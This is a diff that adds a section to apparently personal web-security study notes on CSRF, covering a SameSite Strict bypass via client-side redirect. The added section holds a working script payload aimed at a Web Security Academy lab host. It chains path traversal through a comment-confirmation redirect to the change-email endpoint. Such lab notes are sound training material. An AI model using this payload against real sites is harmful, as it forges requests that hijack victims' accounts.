@@ -283,6 +283,12 @@ Bypassing SameSite Lax restrictions using GET requests
 # Other frameworks support a variety of similar parameters. 
 
 
+                                                                                      ## SameSite Strict bypass via client-side redirect
+
+<script>
+    document.location = "https://0af0000e03c91ecd80b080bd00a1002f.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+
                                             
                                             ## Referer-based defenses against CSRF
                                             
